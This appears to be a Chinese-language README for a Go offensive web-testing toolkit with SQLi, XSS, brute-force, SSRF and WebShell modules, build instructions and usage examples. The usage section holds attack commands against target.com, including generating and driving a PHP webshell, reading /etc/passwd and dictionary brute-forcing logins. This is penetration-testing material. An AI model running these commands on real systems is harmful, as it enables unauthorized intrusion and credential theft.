# Web Attack Toolkit

一个用于公司内部Web安全测试的综合工具集，使用Go语言开发。

## ⚠️ 重要声明

**本工具仅用于授权的安全测试、学习和研究目的。未经授权对系统进行安全测试是违法的。使用者需自行承担法律责任。**

## 功能模块

| 模块 | 命令 | 说明 |
|------|------|------|
| SQL注入检测 | `sqli` | 检测基于错误、布尔盲注、时间盲注、联合查询的SQL注入 |
| XSS检测 | `xss` | 检测反射型XSS，识别HTML/JS/属性等多种上下文 |
| Web漏洞扫描器 | `scan` | 综合扫描：目录发现、安全头、Cookie、CORS、信息泄露等 |
| 暴力破解 | `brute` | 表单/HTTP Basic/Digest 认证暴力破解 |
| CSRF/SSRF | `csrf-ssrf` | CSRF保护缺失检测 + SSRF漏洞测试 |
| WebShell管理 | `shell` | Shell管理、命令执行、文件上传下载、交互式会话 |

## 构建与打包

### 环境要求

| 依赖 | 最低版本 | 说明 |
|------|----------|------|
| Go | 1.21+ | 编译环境 |
| Git | 任意 | 版本控制（可选） |
| UPX | 4.0+ | 二进制压缩（可选，能减小 60-70% 体积） |

```bash
# 检查 Go 版本
go version   # 需要 go1.21 或更高

# 安装 UPX（可选，Windows 用 scoop/choco）
scoop install upx
# 或
choco install upx
```

---

### 方式一：本地编译（当前平台）

```bash
# 1. 进入项目目录
cd webattack

# 2. 下载依赖
go mod tidy

# 3. 编译（Windows 输出 .exe，Linux/macOS 无后缀）
go build -o webattack.exe .

# 4. 验证
./webattack.exe --help
```

---

### 方式二：跨平台编译（一次打出所有平台）

Go 原生支持交叉编译，无需额外工具。在 **Windows PowerShell** 中执行：

```powershell
# 设置版本号（编译时注入）
$VERSION = "1.0.0"
$BUILD_TIME = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# 创建输出目录
New-Item -ItemType Directory -Force -Path bin

# ============ Windows (amd64) ============
$env:GOOS = "windows"
$env:GOARCH = "amd64"
$env:CGO_ENABLED = "0"
go build -ldflags "-s -w -X main.version=$VERSION -X main.buildTime=$BUILD_TIME" `
    -o bin/webattack_windows_amd64.exe .

# ============ Windows (386, 32位) ============
$env:GOARCH = "386"
go build -ldflags "-s -w" -o bin/webattack_windows_386.exe .

# ============ Linux (amd64) ============
$env:GOOS = "linux"
$env:GOARCH = "amd64"
go build -ldflags "-s -w" -o bin/webattack_linux_amd64 .

# ============ Linux (arm64) ============
$env:GOARCH = "arm64"
go build -ldflags "-s -w" -o bin/webattack_linux_arm64 .

# ============ macOS (amd64 / Intel) ============
$env:GOOS = "darwin"
$env:GOARCH = "amd64"
go build -ldflags "-s -w" -o bin/webattack_darwin_amd64 .

# ============ macOS (arm64 / Apple Silicon) ============
$env:GOARCH = "arm64"
go build -ldflags "-s -w" -o bin/webattack_darwin_arm64 .

# 恢复默认
$env:GOOS = ""
$env:GOARCH = ""
```

**Linux / macOS 终端** 中执行：

```bash
VERSION="1.0.0"
BUILD_TIME=$(date "+%Y-%m-%d %H:%M:%S")
mkdir -p bin

# Windows
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
  go build -ldflags "-s -w" -o bin/webattack_windows_amd64.exe .

GOOS=windows GOARCH=386 CGO_ENABLED=0 \
  go build -ldflags "-s -w" -o bin/webattack_windows_386.exe .

# Linux
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 \
  go build -ldflags "-s -w" -o bin/webattack_linux_amd64 .

GOOS=linux GOARCH=arm64 CGO_ENABLED=0 \
  go build -ldflags "-s -w" -o bin/webattack_linux_arm64 .

# macOS
GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 \
  go build -ldflags "-s -w" -o bin/webattack_darwin_amd64 .

GOOS=darwin GOARCH=arm64 CGO_ENABLED=0 \
  go build -ldflags "-s -w" -o bin/webattack_darwin_arm64 .
```

---

### 方式三：使用 Makefile 一键打包

项目根目录创建 `Makefile`：

```makefile
VERSION := 1.0.0
BUILD_TIME := $(shell date "+%Y-%m-%d %H:%M:%S")
LDFLAGS := -s -w -X main.version=$(VERSION) -X main.buildTime=$(BUILD_TIME)

.PHONY: all clean build build-all compress

# 编译当前平台
build:
	go build -ldflags "$(LDFLAGS)" -o bin/webattack .

# 全平台编译
build-all:
	@mkdir -p bin
	# Windows
	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "$(LDFLAGS)" -o bin/webattack_windows_amd64.exe .
	GOOS=windows GOARCH=386   CGO_ENABLED=0 go build -ldflags "$(LDFLAGS)" -o bin/webattack_windows_386.exe .
	# Linux
	GOOS=linux   GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "$(LDFLAGS)" -o bin/webattack_linux_amd64 .
	GOOS=linux   GOARCH=arm64 CGO_ENABLED=0 go build -ldflags "$(LDFLAGS)" -o bin/webattack_linux_arm64 .
	# macOS
	GOOS=darwin  GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "$(LDFLAGS)" -o bin/webattack_darwin_amd64 .
	GOOS=darwin  GOARCH=arm64 CGO_ENABLED=0 go build -ldflags "$(LDFLAGS)" -o bin/webattack_darwin_arm64 .
	@echo "Build complete! Output in bin/"

# UPX 压缩（可选，大幅减小体积）
compress:
	upx --best bin/webattack_windows_amd64.exe || true
	upx --best bin/webattack_linux_amd64 || true
	upx --best bin/webattack_darwin_amd64 || true

# 一键：编译 + 压缩
release: build-all compress
	@ls -lh bin/

# 清理
clean:
	rm -rf bin/
```

使用：

```bash
make build       # 仅编译当前平台
make build-all   # 全平台编译
make release     # 全平台编译 + UPX 压缩
make clean       # 清理
```

---

### 编译参数说明

| 参数 | 作用 |
|------|------|
| `-s` | 去除符号表（减小体积） |
| `-w` | 去除 DWARF 调试信息（减小体积） |
| `-ldflags "-s -w"` | 组合使用，减小 30-40% 体积 |
| `CGO_ENABLED=0` | 禁用 CGO，生成纯静态二进制，无 libc 依赖 |
| `UPX --best` | 进一步压缩，可减小到原体积的 30% |
| `GOOS` | 目标操作系统：`windows` / `linux` / `darwin` |
| `GOARCH` | 目标架构：`amd64` / `386` / `arm64` |

---

### 编译产物

```
webattack/bin/
├── webattack_windows_amd64.exe    # Windows 64位  (~12MB)
├── webattack_windows_386.exe      # Windows 32位
├── webattack_linux_amd64          # Linux 64位
├── webattack_linux_arm64          # Linux ARM64
├── webattack_darwin_amd64         # macOS Intel
└── webattack_darwin_arm64         # macOS Apple Silicon (M1/M2)
```

> **体积对比**：原始 ~12MB → `-s -w` 后 ~8MB → UPX 压缩后 ~3MB

---

### 安装到系统 PATH（可选）

**Windows：**
```powershell
# 放到某个 PATH 目录
copy bin\webattack_windows_amd64.exe C:\Windows\System32\webattack.exe
# 或者加到用户 PATH
mkdir $env:USERPROFILE\bin
copy bin\webattack_windows_amd64.exe $env:USERPROFILE\bin\webattack.exe
```

**Linux / macOS：**
```bash
sudo cp bin/webattack_linux_amd64 /usr/local/bin/webattack
sudo chmod +x /usr/local/bin/webattack
```

## 使用示例

### SQL注入扫描
```bash
# 基础扫描
./webattack sqli -u "http://target.com/page.php?id=1"

# 带WAF检测
./webattack sqli -u "http://target.com/page.php?id=1" --waf -v

# 输出报告
./webattack sqli -u "http://target.com/page.php?id=1" -o report.txt
```

### XSS检测
```bash
./webattack xss -u "http://target.com/search.php?q=test" -v
```

### 综合漏洞扫描
```bash
./webattack scan -u "http://target.com" -v -o scan_report.txt
```

### 暴力破解
```bash
# 使用内置字典
./webattack brute -u "http://target.com/login.php" --type form

# 自定义字典和字段
./webattack brute -u "http://target.com/login.php" \
  -U payloads/usernames.txt -P payloads/passwords.txt \
  --user-field username --pass-field password \
  --success-str "Welcome" --fail-str "Invalid" \
  -t 10 --rate 20

# HTTP Basic认证
./webattack brute -u "http://target.com/admin" --type basic
```

### CSRF/SSRF
```bash
./webattack csrf-ssrf -u "http://target.com/profile.php"
```

### WebShell管理
```bash
# 生成Shell
./webattack shell generate --type php -p mypass -o shell.php

# 添加Shell
./webattack shell add -u "http://target.com/shell.php" --name "target1" -p mypass

# 列出所有Shell
./webattack shell list

# 执行命令
./webattack shell exec -i 0 -c "whoami"

# 检查Shell存活
./webattack shell check

# 上传文件
./webattack shell upload -i 0 -l local.txt -r /var/www/html/uploaded.txt

# 下载文件
./webattack shell download -i 0 -r /etc/passwd -l passwd.txt

# 交互式会话
./webattack shell interact -i 0
```

## 全局参数

| 参数 | 说明 |
|------|------|
| `-u, --url` | 目标URL |
| `-v, --verbose` | 详细输出 |
| `--proxy` | HTTP代理 (如 `http://127.0.0.1:8080`) |
| `--timeout` | 请求超时(秒) |
| `--user-agent` | 自定义User-Agent |
| `-o, --output` | 输出报告文件 |
| `-t, --threads` | 并发线程数 |

## 项目结构

```
webattack/
├── main.go                 # 主入口 + CLI 命令定义
├── go.mod                  # Go 模块依赖定义
├── go.sum                  # 依赖校验和
├── Makefile                # 一键编译打包脚本
├── README.md               # 项目文档
├── bin/                    # 编译产物输出目录 (make build-all)
├── pkg/
│   ├── httpclient/         # HTTP客户端封装 (代理/SSL/Cookie)
│   │   └── client.go
│   ├── payloads/           # 攻击载荷库 (SQLi/XSS/SSRF/路径穿越)
│   │   └── payloads.go
│   ├── utils/              # 工具函数 (编码/解析/提取)
│   │   └── utils.go
│   ├── sqli/               # SQL注入扫描器
│   │   └── scanner.go
│   ├── xss/                # XSS扫描器 (6种上下文感知)
│   │   └── scanner.go
│   ├── scanner/            # Web综合漏洞扫描器 (8阶段)
│   │   └── scanner.go
│   ├── brute/              # 暴力破解引擎 (表单/Basic/Digest)
│   │   └── brute.go
│   ├── csrfssrf/           # CSRF/SSRF扫描器
│   │   └── csrf_ssrf.go
│   └── shell/              # WebShell管理器 (交互/上传/下载/生成)
│       └── shell.go
└── payloads/               # 字典文件
    ├── usernames.txt
    └── passwords.txt
```

## 技术特性

- **并发扫描**: 支持多线程并发，提高扫描效率
- **速率限制**: 可配置请求速率，避免触发WAF
- **代理支持**: 支持HTTP代理，可配合Burp Suite等工具
- **WAF检测**: 自动识别常见WAF产品
- **上下文感知**: XSS扫描器能识别不同的注入上下文
- **多种认证**: 支持表单、Basic、Digest认证爆破
- **报告生成**: 自动生成详细的测试报告
